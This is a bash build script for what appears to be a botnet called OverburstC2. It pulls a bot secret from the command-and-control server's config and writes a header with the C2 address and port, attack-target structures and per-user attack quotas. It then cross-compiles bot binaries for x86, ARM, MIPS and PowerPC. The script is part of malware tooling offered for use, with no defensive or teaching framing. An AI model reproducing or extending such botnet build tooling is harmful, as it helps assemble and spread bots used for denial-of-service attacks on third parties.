#!/bin/bash

# Get the server secret
SERVER_SECRET=$(cat ~/OverburstC2/src/config/config.json | grep -o '"bot_secret": "[^"]*"' | cut -d'"' -f4)

# Build function
build_arch() {
    local arch_name="$1"
    local output="$2"
    local compiler="$3"
    local flags="$4"
    
    echo "Building $arch_name -> $output"
    
    # Temporarily create config with unique ARCH_NAME
    cat > bot/config_temp.h << EOH
#ifndef CONFIG_H
#define CONFIG_H

#include <time.h>

// Network configuration
#define C2_ADDRESS "127.0.0.1"
#define C2_PORT 1337
#define ARCH_NAME "$arch_name"

// Attack parameters structure
typedef struct {
    char *ip;
    int port;
    time_t end_time;
    int *stop_flag;
} attack_params_t;

// Bot configuration
#define MAX_USERS 100
#define MAX_ATTACKS_PER_USER 10
#define MAX_THREADS 200
#define BUFFER_SIZE 4096
#define BOT_SECRET_B64 "$SERVER_SECRET"

// Individual attack tracking
typedef struct {
    int active;
    int stop;
    int thread_count;
} attack_info_t;

// User attack tracking
typedef struct {
    char username[64];
    int attack_count;
    time_t last_attack_time;
    attack_info_t attacks[MAX_ATTACKS_PER_USER];
} user_attack_t;

#endif
EOH
    
    # Copy temp config to config.h
    cp bot/config_temp.h bot/config.h
    
    # Build
    $compiler $flags -o "$output" bot/*.c -Wall -O2 2>/dev/null
    
    if [ -f "$output" ]; then
        echo "✅ $arch_name built successfully"
    else
        echo "❌ $arch_name build failed"
    fi
}

# Build each architecture with unique name
build_arch "x86_64" "binaries/bot_x86_64" "gcc" ""
build_arch "i686" "binaries/bot_i686" "i686-linux-gnu-gcc" ""
build_arch "armv7l" "binaries/bot_armv7l" "arm-linux-gnueabihf-gcc" ""
build_arch "armv6l" "binaries/bot_armv6l" "arm-linux-gnueabi-gcc" ""
build_arch "mips" "binaries/bot_mips" "mips-linux-gnu-gcc" ""
build_arch "mipsel" "binaries/bot_mipsel" "mipsel-linux-gnu-gcc" ""
build_arch "powerpc" "binaries/bot_powerpc" "powerpc-linux-gnu-gcc" ""

echo "============================================"
echo "All binaries built with unique ARCH_NAME values!"
